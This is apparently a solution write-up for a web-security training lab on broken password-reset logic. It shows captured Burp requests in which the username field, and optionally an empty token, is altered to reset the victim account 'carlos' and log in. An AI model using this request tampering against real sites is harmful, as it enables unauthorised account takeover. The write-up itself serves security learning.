# Lab: Password reset broken logic

### Instructions

This lab's password reset functionality is vulnerable. To solve the lab, reset Carlos's password then log in and access his "My account" page.

```
Your credentials: wiener:peter
Victim's username: carlos
```

### Solution

Clicking on the "Forgot password" button and entering in the provided email client email address, we find the following message:


```
Hello!

Please follow the link below to reset your password.

https://0a74008103419e7281a2890600bf0058.web-security-academy.net/forgot-password?temp-forgot-password-token=baknd44qez1hy0km9cqrqkc5ibbl1ibh

Thanks,
Support team
```

Navigating to this link and changing our password to `test` and capturing this in Burp we find:

```
POST /forgot-password?temp-forgot-password-token=baknd44qez1hy0km9cqrqkc5ibbl1ibh HTTP/1.1
Host: 0a74008103419e7281a2890600bf0058.web-security-academy.net
Cookie: session=F94kdlrlwVwGzSwjnJAsUQpYgXjUxwYy
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Origin: https://0a74008103419e7281a2890600bf0058.web-security-academy.net
Referer: https://0a74008103419e7281a2890600bf0058.web-security-academy.net/forgot-password?temp-forgot-password-token=baknd44qez1hy0km9cqrqkc5ibbl1ibh
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
Connection: keep-alive

temp-forgot-password-token=baknd44qez1hy0km9cqrqkc5ibbl1ibh&username=wiener&new-password-1=test&new-password-2=test
```

Here we have a token, the username of the account, as well as the new password.

Testing if this token is actually valid and being used, we can change the username wiener to the target name carlos and forward the request:

```
temp-forgot-password-token=baknd44qez1hy0km9cqrqkc5ibbl1ibh&username=carlos&new-password-1=test&new-password-2=test
```

Response is:

```
HTTP/2 302 Found
Location: /
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

Indicating carlos' password was successfully changed.

Note: This also works if we remove the token argument entirely:

```
temp-forgot-password-token=&username=carlos&new-password-1=test2&new-password-2=test2
```

We can now login to the app with `carlos:test` and finish the lab.